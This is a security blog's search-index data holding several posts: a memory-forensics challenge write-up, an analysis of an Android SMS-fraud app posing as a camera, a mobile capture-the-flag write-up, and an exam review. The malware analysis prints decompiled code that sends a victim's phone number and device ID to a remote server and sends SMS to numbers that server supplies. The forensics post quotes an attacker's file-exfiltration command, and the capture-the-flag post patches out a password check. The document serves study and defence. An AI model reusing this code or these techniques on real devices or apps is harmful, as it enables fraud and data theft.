{"meta":{"title":"Ikonw","subtitle":"","description":"","author":"Ikonw","url":"https://ik0nw.github.io","root":"/"},"pages":[{"title":"{{title}}","date":"2023-11-29T13:15:20.395Z","updated":"2023-11-29T13:15:20.395Z","comments":true,"path":"template/writeup.html","permalink":"https://ik0nw.github.io/template/writeup.html","excerpt":"","text":""},{"title":"about","date":"2023-12-11T06:33:00.819Z","updated":"2023-12-11T06:33:00.819Z","comments":true,"path":"about/index.html","permalink":"https://ik0nw.github.io/about/index.html","excerpt":"","text":""},{"title":"tags","date":"2023-12-11T06:32:46.161Z","updated":"2023-12-11T06:32:46.161Z","comments":true,"path":"tags/index.html","permalink":"https://ik0nw.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Sherlock - Recollection - Easy","slug":"Sherlock - Recollection","date":"2024-03-23T16:00:00.000Z","updated":"2024-03-24T12:57:50.797Z","comments":true,"path":"2024/03/24/Sherlock - Recollection/","permalink":"https://ik0nw.github.io/2024/03/24/Sherlock%20-%20Recollection/","excerpt":"A junior member of our security team has been performing research and testing on what we believe to be an old and insecure operating system. We believe it may have been compromised &amp; have managed to retrieve a memory dump of the asset. We want to confirm what actions were carried out by the attacker and if any other assets in our environment might be affected. Please answer the questions below.","text":"A junior member of our security team has been performing research and testing on what we believe to be an old and insecure operating system. We believe it may have been compromised &amp; have managed to retrieve a memory dump of the asset. We want to confirm what actions were carried out by the attacker and if any other assets in our environment might be affected. Please answer the questions below. Recently, I have been interested in learning some blue team skills, so I have started to expand my knowledge by tackling Sherlock challenges every week. If there are any inaccuracies or areas for improvement in my writing, please point them out. This article challenge is related to memory forensics. Naturally, the tool used is the renowned volatility. I have always preferred using a combination of GUI (Volatility Workbench) and command line to address memory forensics issues. I also noticed that Volatility has been updated to version 3, but I found it quite unfamiliar. Many plugins from version 2.6 haven’t been successfully ported to version 3. After trying it out, I quickly decided to stick with the older version. This week challenge seemed relatively easy, and I managed to complete 18 questions without spending too much time on them. I typically use a mix of GUI and command line, occasionally transferring files to Kali Linux for analysis, due to my familiarity with Linux’s grep command. Image profileThe first step after obtaining a memory dump is to identify the target’s profile: volatility.exe -f recollection.bin imageinfo For this analysis, the profile Win7SP1x64 was used. Q1 What is the Operating System of the machine?Based on the image info, the answer is Windows 7. Q2 When was the memory dump created?The memory dump creation date, according to the image info, is 2022-12-19 16:07:30 UTC+0000. Q3 After the attacker gained access to the machine, the attacker copied an obfuscated PowerShell command to the clipboard. What was the command?To view clipboard contents, Volatility offers a plugin: volatility.exe -f recollection.bin --profile=Win7SP1x64 clipboard The command found was (gv &#39;*MDR*&#39;).naMe[3,11,2]-joIN&#39;&#39;. Q4 The attacker copied the obfuscated command to use it as an alias for a PowerShell cmdlet. What is the cmdlet name?Reviewing console commands, it’s noted that PowerShell executed the clipboard content using IEX, an alias for Invoke-Expression. Q5 A CMD command was executed to attempt to exfiltrate a file. What is the full command line?An attempt was made to transfer a file to an SMB share:。 type C:\\Users\\Public\\Secret\\Confidential.txt &gt; \\\\192.168.0.171\\pulice\\pass.txt Q6 Following the above command, now tell us if the file was exfiltrated successfully?The file was not successfully exfiltrated, as indicated by the error message The network path was not found. Q7 The attacker tried to create a readme file. What was the full path of the file? Decoding a base64 string revealed the attacker’s intention to demonstrate their prowess: ┌──(ikonw㉿Xing)-[~/Desktop/Mobile_project/C2]└─$ echo &quot;ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi&quot; | base64 -decho &quot;hacked by mafia&quot; &gt; &quot;C:\\Users\\Public\\Office\\readme.txt&quot; Q8 What was the Host Name of the machine?The correct approach involves reading the Hive list and then the registry for the host name. However, the net user command directly revealed the hostname as USER-PC. Q9 How many user accounts were in the machine?Three user accounts were identified from the screenshot. Q10 In the “\\Device\\HarddiskVolume2\\Users\\user\\AppData\\Local\\Microsoft\\Edge” folder there were some sub-folders where there was a file named passwords.txt. What was the full file location&#x2F;path?Using filescan and filtering by file name: volatility.exe -f recollection.bin --profile=Win7SP1x64 filescan | findstr &quot;passwords.txt&quot; The full path found was \\Device\\HarddiskVolume2\\Users\\user\\AppData\\Local\\Microsoft\\Edge\\User Data\\ZxcvbnData\\3.0.0.0\\passwords.txt. Q11 A malicious executable file was executed using command. The executable EXE file’s name was the hash value of itself. What was the hash value? Returning to the console, the execution of a lengthy .exe file was noted: b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1 Q12 Following the previous question, what is the Imphash of the malicous file you found above? The Imphash was located by uploading the file hash to VirusTotal. Q13 Following the previous question, tell us the date in UTC format when the malicious file was created?The creation time can also be found on VirusTotal. Q14 What was the local IP address of the machine?Unfortunately, Volatility cannot directly display the local IP address. However, by examining local connections with netscan, the local IP address 192.168.0.104 was found in localhost. Q15 There were multiple PowerShell processes, where one process was a child process. Which process was its parent process? In this case, the parent process of powershell.exe was identified as cmd.exe. Q16 Attacker might have used an email address to login a social media. Can you tell us the email address?Since logging in usually involves using a browser, multiple msedge processes were found using psScan. I chose one of the earlier processes for memdump and then captured strings: volatility.exe -f recollection.bin --profile=Win7SP1x64 memdump -p 2380 -D msedgestrings 2380.dmp| grep email Scrolling up in the output revealed a suspicious email: mafia_code1337@gmail.com Q17 Using MS Edge browser, the victim searched about a SIEM solution. What is the SIEM solution’s name?This question was challenging because Volatility does not have a plugin to extract MS Edge browsing records. Upon consulting with my good friend, I discovered that a History file stored the browser history. By searching for strings, I located the target address and used memdump to transfer the target file into the Kali file system: volatility.exe -f recollection.bin --profile=Win7SP1x64 dumpfiles -Q 0x000000011e0d16f0 --dump-dir=\\\\192.168.245.175\\shared\\ Volatility Foundation Volatility Framework 2.6.1DataSectionObject 0x11e0d16f0 None \\Device\\HarddiskVolume2\\Users\\user\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\HistorySharedCacheMap 0x11e0d16f0 None \\Device\\HarddiskVolume2\\Users\\user\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History Upon examining the strings in the target file, Wazuh was clearly seen. Q18 The victim user downloaded an exe file. The file’s name was mimicking a legitimate binary from Microsoft with a typo (i.e. legitimate binary is powershell.exe and attacker named a malware as powershall.exe). Tell us the file name with the file extension?Returning to the console commands, we discovered csrsss.exe, which has an extra ‘s’ compared to the legitimate Windows csrss.exe. Here, we also encountered the wazuh from the previous question.","categories":[],"tags":[]},{"title":"Android Malware RE- ThaiCamera","slug":"Android Malware RE - ThaiCamera","date":"2024-02-04T16:00:00.000Z","updated":"2024-02-05T15:33:00.185Z","comments":true,"path":"2024/02/05/Android Malware RE - ThaiCamera/","permalink":"https://ik0nw.github.io/2024/02/05/Android%20Malware%20RE%20-%20ThaiCamera/","excerpt":"PurposeThe target of this exercise is to reverse engineering the application to check if it has send SMS fruds activity.","text":"PurposeThe target of this exercise is to reverse engineering the application to check if it has send SMS fruds activity. PurposeThe target of this exercise is to reverse engineering the application to check if it has send SMS fruds activity. StartFirstly, for effective Reverse engineering, we must not dive in and read the code line by lines. Since we are targeting if the application sends frud SMS, we should look for the Send SMS functions. Have some research we found that, SmsManager is the standard API provided by Android for sending SMS messages, it allows to send text messages without user interaction. SMS Manager API sendTextMessage() sendMultipartTextMessage() SendDataMessage() The thing caught my eye is the URL in the BootService It listen for broadcast receiver, and if the action of is equal to SENT_HUGE_SMS_ACTION it will actually load a intent of ACTION_START and send the broadcast. @Override // android.content.BroadcastReceiver public void onReceive(Context context, Intent intent) &#123; String action = intent.getAction(); if (&quot;SENT_HUGE_SMS_ACTION&quot;.equals(action)) &#123; switch (getResultCode()) &#123; case -1: BootService.this.sendmessageStatus(AppEventsConstants.EVENT_PARAM_VALUE_YES); Intent start_intent = new Intent(Loading.ACTION_START); context.sendBroadcast(start_intent); return; case 0: default: BootService.this.sendmessageStatus(AppEventsConstants.EVENT_PARAM_VALUE_NO); return; case 1: BootService.this.sendmessageStatus(&quot;2&quot;); return; case 2: BootService.this.sendmessageStatus(&quot;4&quot;); return; case 3: BootService.this.sendmessageStatus(&quot;5&quot;); return; case 4: BootService.this.sendmessageStatus(&quot;3&quot;); return; &#125; &#125; &#125;&#125; The above code also states about the sendmessageStatus appear in the same file. It gets the phone particular and send along with the SMS status with POST request to http://139.59.107.168:8088 private String getPhoneNumber() &#123; TelephonyManager mTelephonyMgr = (TelephonyManager) getSystemService(&quot;phone&quot;); return mTelephonyMgr.getLine1Number(); &#125; public void sendmessageStatus(String status) &#123; if (TextUtils.isEmpty(this.phone)) &#123; this.phone = getPhoneNumber(); &#125; String device = getDeviceId(); try &#123; String spec = &quot;http://139.59.107.168:8088/smspostback?phone=&quot; + this.phone + &quot;&amp;status=&quot; + status + &quot;&amp;diviceid=&quot; + device; URL url = new URL(spec); HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection(); urlConnection.setRequestMethod(&quot;POST&quot;); urlConnection.setReadTimeout(5000); urlConnection.setConnectTimeout(5000); urlConnection.setDoOutput(true); urlConnection.setDoInput(true); if (urlConnection.getResponseCode() == 200) &#123; Log.e(GraphResponse.SUCCESS_KEY, GraphResponse.SUCCESS_KEY); &#125; else &#123; Log.e(&quot;error&quot;, &quot;error&quot;); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; private String getDeviceId() &#123; TelephonyManager TelephonyMgr = (TelephonyManager) getSystemService(&quot;phone&quot;); return TelephonyMgr.getDeviceId(); &#125;&#125; The intent &quot;SENT_HUGE_SMS_ACTION is very suspicious, we can have a search on the string. It appear in the .com.cp.camera.loading. The method name is called sendMessage. It initialized a bundle object. Bundle is a key-value store for passing data between Android components. it then map the key FirebaseAnalytics.Param.ITEM_NAME to string SEND_SMS next it created a new Intent called SENT_HUGE_SMS_ACTION and put the bundle as a parameter into the intent. Next it created a smsManager instance. PendingIntent sentintent = PendingIntent.getBroadcast(this, 0, itSend, 134217728); This is a static method call to PendingIntent.getBroadcast() which returns a PendingIntent that will perform a broadcast. The 4 parameter, this refer to the current context, 0 is a request code, its usually set to 0 because it’s not used for broadcast PendingIntent, the third paramter itsend is obviously the intent to be broadcast which the action is SEND_HUGE_SMS_ACTION. Lastly, the last parameter control how the methods behave, in this case, 134217728 corresponds to the flag PendingIntent.FLAG_UPDATE_CURRENT which update the existing PendingIntent if it already exists, otherwise creates a new one. FLAG_UPDATE_CURRENT public void sendMessage(String mobile, String content) &#123; Bundle bundle = new Bundle(); bundle.putString(FirebaseAnalytics.Param.ITEM_NAME, &quot;SEND_SMS&quot;); this.mFirebaseAnalytics.logEvent(FirebaseAnalytics.Event.SELECT_CONTENT, bundle); Intent itSend = new Intent(&quot;SENT_HUGE_SMS_ACTION&quot;); itSend.putExtras(bundle); SmsManager sms = SmsManager.getDefault(); PendingIntent sentintent = PendingIntent.getBroadcast(this, 0, itSend, 134217728); try &#123; if (content.length() &gt; 70) &#123; List&lt;String&gt; msgs = sms.divideMessage(content); for (String msg : msgs) &#123; sms.sendTextMessage(mobile, null, msg, sentintent, null); &#125; return; &#125; sms.sendTextMessage(mobile, null, content, sentintent, null); &#125; catch (Exception e) &#123; SharedPreferences sharedPreferences = getSharedPreferences(&quot;videoLibrary&quot;, 0); SharedPreferences.Editor editor = sharedPreferences.edit(); editor.putString(&quot;videoShare&quot;, AppEventsConstants.EVENT_PARAM_VALUE_NO); editor.apply(); e.printStackTrace(); &#125;&#125; After that, I guess its checking the content length of the message, if the content length is more than 70, it actually call the method sms.divideMessage to divide the sms into multiple SMS. and Send one by one. The reason being SMS messages are limited to 70 character in UC-2 encoding. try &#123; if (content.length() &gt; 70) &#123; List&lt;String&gt; msgs = sms.divideMessage(content); for (String msg : msgs) &#123; sms.sendTextMessage(mobile, null, msg, sentintent, null); &#125; return; &#125; sms.sendTextMessage(mobile, null, content, sentintent, null); This is my first time encounter the sms.sendTextMessage public void sendTextMessage (String destinationAddress, String scAddress, String text, PendingIntent sentIntent, PendingIntent deliveryIntent) sms.sendTextMessage(mobile, null, msg, sentintent, null); destination Address - The address the message to; In this case is the mobile number scAddress - the Service center address or null to use the current default SMSC text - The body of the message sentIntent - the intent to handle the result of sending the message, such as whether it was successfully sent or not . Good now we know what sendMessage do (Actually can tell by the name, but for the sake of study). Next, we can look for which methods or class called this sendMessage. It appear in the same file public void onClick(View v) &#123; if (Build.VERSION.SDK_INT &lt; 23) &#123; if (Loading.this.service != null &amp;&amp; Loading.this.content != null) &#123; Loading.this.sendMessage(Loading.this.service, Loading.this.content); return; &#125; return; &#125; int checkCallPhonePermission = ContextCompat.checkSelfPermission(Loading.this.getApplicationContext(), &quot;android.permission.SEND_SMS&quot;); if (Loading.this.videoShare.equals(AppEventsConstants.EVENT_PARAM_VALUE_YES) &amp;&amp; checkCallPhonePermission == 0) &#123; if (Loading.this.service != null &amp;&amp; Loading.this.content != null) &#123; Loading.this.sendMessage(Loading.this.service, Loading.this.content); return; &#125; return; It firstly check if the version is less than 23, if less than 23, it will directly called the method Loading.this.sendMessage(Loading.this.service, Loading.this.content);. According to what we have analysis just now, the first parameter is the number, second parameter is the message body. The name seems funny, but its alright, will come back to this later, if the version is more than 23, it will check if the application have the permission of &quot;android.permission.SEND_SMS&quot; Android runtime permission The above link states that if the android SDK version is 23 (Android 6.0) and above it need to request for runtime permission. Ok back to the topic, the code below will check if run time permission is granted, and send the message. So now, what is this.service and this.content, this is our main focus, where the message is beings sent to and what is the content. protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_mainfir); this.ms_show = (TextView) findViewById(R.id.ms_show); this.mReceiver = new StartActivityReceiver(); registerReceiver(this.mReceiver, new IntentFilter(ACTION_START)); TelephonyManager telManager = (TelephonyManager) getSystemService(&quot;phone&quot;); String operator = telManager.getSimOperator(); this.button_sensms = (Button) findViewById(R.id.button_sensms); if (Build.VERSION.SDK_INT &gt; 9) &#123; StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build(); StrictMode.setThreadPolicy(policy); &#125; Intent service_intent = new Intent(this, BootService.class); startService(service_intent); String jsonStr = loginByPost(operator); try &#123; JSONObject object = new JSONObject(jsonStr); this.content = object.getString(&quot;content&quot;); this.rule = object.getString(&quot;rule&quot;); this.service = object.getString(&quot;service&quot;); this.status = object.getString(&quot;code&quot;); this.button = object.getString(&quot;button&quot;); this.IMEIS = object.getString(&quot;imei&quot;); this.imeicontent = object.getString(&quot;imeicontent&quot;); &#125; catch (JSONException e) &#123; e.printStackTrace(); &#125; if (this.rule != null) &#123; this.ms_show.setText(this.rule); &#125; if (this.button != null) &#123; this.button_sensms.setText(this.button); &#125; if (operator != null &amp;&amp; this.imeicontent != null &amp;&amp; !this.imeicontent.equals(&quot;&quot;)) &#123; String[] imeicontents = this.imeicontent.split(&quot;,&quot;); int i = 0; while (true) &#123; if (i &gt;= imeicontents.length) &#123; break; &#125; String[] imei = imeicontents[i].split(&quot;:&quot;); if (!operator.equals(imei[0])) &#123; i++; &#125; else &#123; this.shareSend = 1; this.service = imei[1]; this.content = imei[2]; break; &#125; &#125; &#125; Above file is written onCreate method in the same file. this.service = object.getString(&quot;service&quot;); We can see that this.service is get through the object. JSONObject object = new JSONObject(jsonStr); The object is a JSON object by jsonStr String jsonStr = loginByPost(operator); The jsonStr comes from the function loginByPost with parameter operator. String operator = telManager.getSimOperator(); The operator is the value of telManager.getSimOperator() Very interesting, this getSimOpertor retrieves the MCC+MNC(Mobile Country Code + Mobile NetWork Code) of the active SIM card as a string. Let’s have a example for Singapore, the MMC (Mobile Country Code) is 525, the MNC (Mobile Network Code) depends on the mobile network operator. Singtel MNC - 01 StarHub MNC - 05 M1 MNC - 03 So if we are using Singtel SIMCard, the value return will be 52501 Cool! Let’s examine the loginByPost method. public String loginByPost(String code) &#123; String str = Build.VERSION.RELEASE; String str2 = Build.MODEL; getPhoneNumber(); getDeviceId(); try &#123; String spec = &quot;http://139.59.107.168:8088/appsharejson?code=&quot; + code; URL url = new URL(spec); HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection(); urlConnection.setRequestMethod(&quot;POST&quot;); urlConnection.setReadTimeout(5000); urlConnection.setConnectTimeout(5000); urlConnection.setDoOutput(true); urlConnection.setDoInput(true); if (urlConnection.getResponseCode() == 200) &#123; InputStream is = urlConnection.getInputStream(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] buffer = new byte[1024]; while (true) &#123; int len = is.read(buffer); if (len != -1) &#123; baos.write(buffer, 0, len); &#125; else &#123; is.close(); baos.close(); return new String(baos.toByteArray()); &#125; &#125; &#125; else &#123; return &quot;error&quot;; &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); return &quot;error&quot;; &#125;&#125; It sends the MMC+MNC string to the target server with a POST request String spec = &quot;http://139.59.107.168:8088/appsharejson?code=&quot; + code;URL url = new URL(spec);HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();urlConnection.setRequestMethod(&quot;POST&quot;);urlConnection.setReadTimeout(5000);urlConnection.setConnectTimeout(5000);urlConnection.setDoOutput(true);urlConnection.setDoInput(true); Next, it check if the request status code is 200, then it read the response content into buffer and return it as a string. So we can safely conclude that the the the user’s MNC+MMC is being sent to the target server, then the target server returns a json contains the follow values: this.content = object.getString(&quot;content&quot;);this.rule = object.getString(&quot;rule&quot;);this.service = object.getString(&quot;service&quot;);this.status = object.getString(&quot;code&quot;);this.button = object.getString(&quot;button&quot;);this.IMEIS = object.getString(&quot;imei&quot;);this.imeicontent = object.getString(&quot;imeicontent&quot;); Now, let’s determine how the Send SMS frud is being triggered, we can search by the usage of the sendMessage method @Override // android.app.Activitypublic void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) &#123; super.onRequestPermissionsResult(requestCode, permissions, grantResults); if (requestCode == 1 &amp;&amp; grantResults[0] == 0) &#123; if (this.service != null &amp;&amp; this.content != null) &#123; sendMessage(this.service, this.content); return; &#125; return; &#125; Toast.makeText(this, &quot;Please allow access！&quot;, 1).show();&#125; This piece of code is previously we are talking about the requesting the runtime permission, it requests for the runtime permission, as long as it gets the permission, it will actually call the sendMessage method. findViewById(R.id.button_sensms).setOnClickListener(new View.OnClickListener() &#123; // from class: com.cp.camera.Loading.1 @Override // android.view.View.OnClickListener public void onClick(View v) &#123; if (Build.VERSION.SDK_INT &lt; 23) &#123; if (Loading.this.service != null &amp;&amp; Loading.this.content != null) &#123; Loading.this.sendMessage(Loading.this.service, Loading.this.content); return; &#125; return; &#125;.................................. Coming back to this code, it actually is a onClick method, which requires user interaction. Looking at the findViewById(R.id.button_sensms seems the button to click. Follow up with the button_sensms It seems the text is based on the previous server response too. Weird. Alright anyway the full picture of this malware should be. When the application is started, it will send the victim’s SIM Card details to the remote server, remote server may depends on the victim SIM Card details providing different set of numbers? (Maybe targeting different country) or texts. Then it request for user runtime permission to allow send SMS.","categories":[],"tags":[]},{"title":"HTB-Mobile-Challenge","slug":"HTB-Mobile-Challenge","date":"2024-01-19T16:00:00.000Z","updated":"2024-02-05T15:35:19.641Z","comments":true,"path":"2024/01/20/HTB-Mobile-Challenge/","permalink":"https://ik0nw.github.io/2024/01/20/HTB-Mobile-Challenge/","excerpt":"APKeyThis app contains some unique keys. Can you get one?","text":"APKeyThis app contains some unique keys. Can you get one? APKey This app contains some unique keys. Can you get one? Firstly, install the app to inspect the activity main page. However, face difficulties with installing through adb prompt will following errors: &#96;adb: failed to install backup.apk: Failure [-124: Failed parse during installPackageLI: Targeting R+ (version 30 and above) requires the resources.arsc of installed APKs to be stored uncompressed and aligned on a 4-byte boundary] After some research, we have to align the packet in bytes of 4 using zipalign. $ zipalign --help zipalign: symbol lookup error: zipalign: undefined symbol: _ZN11zip_archive6WriterD2Ev when trying to launch zipalign from kali linux, I have problem with error for the packet. After more research. zipalignManage to download the right package from this site. perform dpkg -i &lt;package.deb&gt; When installing we are missing android-libandroidfw package. $ sudo dpkg -i zipalign_8.1.0+r23-2_amd64.deb Selecting previously unselected package zipalign.(Reading database ... 421645 files and directories currently installed.)Preparing to unpack zipalign_8.1.0+r23-2_amd64.deb ...Unpacking zipalign (1:8.1.0+r23-2) ...dpkg: dependency problems prevent configuration of zipalign: zipalign depends on android-libandroidfw; however: Package android-libandroidfw is not installed.dpkg: error processing package zipalign (--install): dependency problems - leaving unconfiguredProcessing triggers for kali-menu (2023.4.6) ...Processing triggers for man-db (2.12.0-1) ...Errors were encountered while processing: zipalign Performa a install on the package sudo apt-get install android-libandroidfw And now we got our zipalign working $ zipalign -p 4 APKey.apk zipalign_APKEY.apk Next we can perform a check if the APK is aligned with 4 bytes Good! After realign the APK, we have to sign the application again using apksigner with the fake private key keytool -genkeypair -v -keystore my-release-key.jks -keyalg RSA - keysize 2048 -validity 10000 -alias my-alias apksigner sign --ks my-release-key.jks zipalign_APKEY.apk Manage to install the application sucessfully this time round. The application requires a authentication for a key. Decompile APKDecompile the application with apktool apktool d apkey.apk Also open it using jadx-gui Inspecting at the manifest file, found the launcher is at MainActivity &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:versionCode=&quot;1&quot; android:versionName=&quot;1.0&quot; android:compileSdkVersion=&quot;30&quot; android:compileSdkVersionCodename=&quot;11&quot; package=&quot;com.example.apkey&quot; platformBuildVersionCode=&quot;30&quot; platformBuildVersionName=&quot;11&quot;&gt; &lt;uses-sdk android:minSdkVersion=&quot;16&quot; android:targetSdkVersion=&quot;30&quot;/&gt; &lt;application android:theme=&quot;@style/Theme.APKey&quot; android:label=&quot;@string/app_name&quot; android:icon=&quot;@mipmap/ic_launcher&quot; android:allowBackup=&quot;true&quot; android:supportsRtl=&quot;true&quot; android:roundIcon=&quot;@mipmap/ic_launcher_round&quot; android:appComponentFactory=&quot;androidx.core.app.CoreComponentFactory&quot;&gt; &lt;activity android:name=&quot;com.example.apkey.MainActivity&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt; &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt; &lt;/intent-filter&gt; &lt;/activity&gt; &lt;/application&gt;&lt;/manifest&gt; As from the previous section, we notice that the login page requires 2 input box, username and password. It is declare at line 22 and 23 with object EditText This is further prove by if (MainActivity.this.f928c.getText().toString().equals(&quot;admin&quot;)) &#123;which it is checking if the user input for f928c is equal to admin. Next it create a MD5 object and hash the user provided password and check if it is equal to a2a3d412e92d896134d9c9126d756f. However this hash is uncrackable. Since it is a simple logic of EQUAL , we can modify the smali code to become NOT EQUAL. but first, we have to allocate where is the comparison in smali. From the apktool decompile folder, navigate to smali/com/example/MainActivity$a.smali About line 141, we saw the hash a2a3d412e92d896134d9c9126d756f :try_start_2 invoke-virtual &#123;p1&#125;, Ljava/security/NoSuchAlgorithmException;-&gt;printStackTrace()V const-string p1, &quot;&quot; :goto_1 const-string v1, &quot;a2a3d412e92d896134d9c9126d756f&quot; .line 2 invoke-virtual &#123;p1, v1&#125;, Ljava/lang/String;-&gt;equals(Ljava/lang/Object;)Z move-result p1 if-eqz p1, :cond_1 iget-object p1, p0, Lcom/example/apkey/MainActivity$a;-&gt;b:Lcom/example/apkey/MainActivity; A sample of code near the hash, we can see that the second line invoke-virtual &#123;p1&#125;, Ljava/security/NoSuchAlgorithmException;-&gt;printStackTrace()Vis actually the printStackTrace function corresponding to the red box. const-string p1, &quot;&quot; next it set the p1 register to an empty string. :goto_1 seems a JUMP label which if refer to the code, it is the end of catch. const-string v1, &quot;a2a3d412e92d896134d9c9126d756f&quot;. next it set the V1 register. On a side note, was curious if the register stored the address or the actual value. http://pallergabor.uw.hu/androidblog/dalvik_opcodes.html after that it perform equal function with the string and the hash invoke-virtual &#123;p1, v1&#125;, Ljava/lang/String;-&gt;equals(Ljava/lang/Object;)Z This equal function takes in 2 parameter, and return a boolean Z move-result p1 next it move the boolean result into p1. if-eqz p1, :cond_1 check if P1 is true, then it jumps to label cond_1 Which this is the critical statement that wanted to change, with a little bit help from CHATGPT. Good, we have the code now, let’s save the changes. Compile the samli app using apktool $ $ apktool b APKey Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=trueI: Using Apktool 2.9.3I: Checking whether sources has changed...I: Smaling smali folder into classes.dex...I: Checking whether resources has changed...I: Building resources...I: Building apk file...I: Copying unknown files/dir...I: Built apk into: APKey/dist/APKey.apk Zipalign the 4 bytes and sign again $ zipalign -p 4 APKey.apk zipalign_APKEY.apk$ apksigner sign --ks ~/Desktop/my-release-key.jks zipalign_APKEY.apk$ adb install zipalign_APKEY.apk Performing Incremental InstallServing... Type random password, will result in not equal the hash and it actually print the flag.","categories":[],"tags":[]},{"title":"OSEP REVIEW","slug":"osep_review","date":"2022-04-11T16:00:00.000Z","updated":"2023-11-30T10:28:54.440Z","comments":true,"path":"2022/04/12/osep_review/","permalink":"https://ik0nw.github.io/2022/04/12/osep_review/","excerpt":"","text":"概括之前旧的OSCE因为太过老旧加上新的 OFFSEC CEO上岗，就把OSCE分出了新的两部分 + OSWE 形成了OSCE3的证书 而旧的OSCE 也再2020年10月下架了。 当然主要的是本文中提到的OSEP (Offensive Security Experienced Penetration Tester) 属于 “进阶渗透” ，相比OSCP，课程的前半部分提供了钓鱼，免杀，后半部分则是对域的横向提权。 免杀的部分则是用了C#，VBA以及Powershell。这时你就会问 如果我不会C#和VBA，我是不是要先去B站看几个视频再去买课？ 答案是不用的，我最喜欢课程的一点是会慢慢的循环带进。本人没有一丁点C#以及VBA方面的知识，但跟着课程走完后。对这两个语言或多或少有点了解。 对于价钱以及其他课程的要求可以自行前往官网查看 我就不一一介绍了。 个人背景在官网的Course Prerequisites里有要求对域环境和攻击有基本的了解。 我在2020年初的时候考过了OSCP，那时的资料对域环境的比较少考试也没有考域环境类的攻击。 在杨成龙大哥的推荐下 购买了CRTP(CERTIFIED RED TEAM PROFESSIONAL) 这课程对那些域的初学者十分友好，也是慢慢的熟悉各种姿势。 然后我看我自己应该符合课程的要求了，就想去新官网预约下课程开始的时间，本来想预约两周后的结果给我当场就开始课程了。 但结果是扎心的，还是直接开始了 60天OSEP的课程实验室分为两部分，一部分是给你练习PDF上面的内容，另外一部分为Challenge lab模拟真实的域环境让你练习再PDF上面学到的内容，并且是没有答案的。 由于本人是再新加坡服兵役，只有晚上才能碰到自己的电脑，每晚大约有4-5个小时的学习时间。有时还一到家就马上倒头就睡的情况。 花了大概30天左右的时间，读完了PDF以及练习，然后用剩下的30天来打完6个Challenge lab。 当我做完PDF练习的时候比我预想的还要快，我就马上定了离我Lab结束后两周的考试时间 好像是21年10月26日。 但后来因为再10月15日左右，因为有人貌似再网上泄露的考试题目，就全面取消了全部考试。 然后当时因为英雄联盟手游国服出了，就专心打游戏去了（狗头）…… 考试OSCE3的证书都是48小时考试+24小时报告，并且有监考 需要全程保持摄像头开启和保持对桌面的共享（全部显示屏） 需要去厕所，离开电脑前都需要跟监考报备。 第一次考试第一次考试的时候，前个晚上熬了夜 没咋睡好，然后10点钟的考试让我眼睛差点都睁不开。 到下午3点的时候才拿到第一个Flag,然后就太困跟监考说了声然后去睡了个午觉。 在后续的时间里我只拿到了3个Flag， 离及格还差7个，惨淡收尾。 第二次在准备第二次考试时， 我去了HackTheBox 的平台购买了Offshore的一个域环境的靶机自己多加练习。 Offshore跟Lab的差别可能就是Offshore多了一些其他的小东西，比如Web攻击，提权以及没有任何的AV。 Offshore有21台主机，有四个域让你横向。其中当然也学到了一些新的横向技巧，以及完善自己对域环境的enumeration和更多的impacket花式使用技巧。 对那些做完Lab，并且还是对自己没有任何信心的可以尝试去HTB订阅下这个域环境（就是价钱稍贵） 第一个月是70欧元（启动费）+ 20欧元 （订阅费），后续的每个月只需要20欧元的订阅费即可。 考试的前一天也去了Offsec Discord 频道看了一些大佬的考试建议。 然后再考试当天，这次学聪明了，把时间定在了12点开始。 12点钟的时候例行跟监考检查身份证信息和考试环境。 整个考试过程挺流畅的，在当天晚上23点的时候已经拿到7个Flag 并且对下个Flag有些眉目了。 第二天 8点起床 然后吃早餐消化，10点继续考试，很顺利的在半小时内对昨晚的命令做了些调整成功拿下第八个Flag。 12点的时候成功拿下第9个Flag，在接下来的六个小时里，没有任何收获。心情开始逐渐焦虑，于是就去洗了个澡吃了晚餐，陪了下侄子。 然后回到考试内半小时就顺利找到第十个Flag，拿到了及格分数。 然后开始的陪朋友“休闲”了会儿。 在凌晨开始写报告，写了五个小时 把全部的截图以及步骤详细写了，提交完就然后昏昏欲睡了。 很顺利地在隔天的Offsec Portal发现自己及格了考试 FAQ1. 我没有OSCP可以直接报名OSEP嘛？ 答案：是可以的，OSEP没有任何前置要求，但本人还是推荐有OSCP的经验再考 有更大的几率通过考试 2. 课程里好像有很多C#编程和免杀部分的知识，我不会怎么办？ 答案：课程会带你从0到1，慢慢一步一步教。 3. 课程精华的部分是在哪里？ 答案：我个人觉得整个课程最精华就是C#免杀编程里。 4. 课程教的免杀技巧和方式能过最新的Windows Defender嘛？ 答案：不能，但在av扫描的网站还是只有极少数可以侦察到，最重要的是教你的这个思路，这个PEN-300给了你这个牢固的地砖，你可以在上面的代码做出修改。挺多Discord的人都通过课程教的然后自己修改能达到 VirusTotal 0个侦察。 5. Pdf和Challenge lab时间应该如何分配呢？ 答案： 个人建议是多花时间在Challenge Lab。","categories":[],"tags":[{"name":"offsec","slug":"offsec","permalink":"https://ik0nw.github.io/tags/offsec/"}]},{"title":"HTB Academy 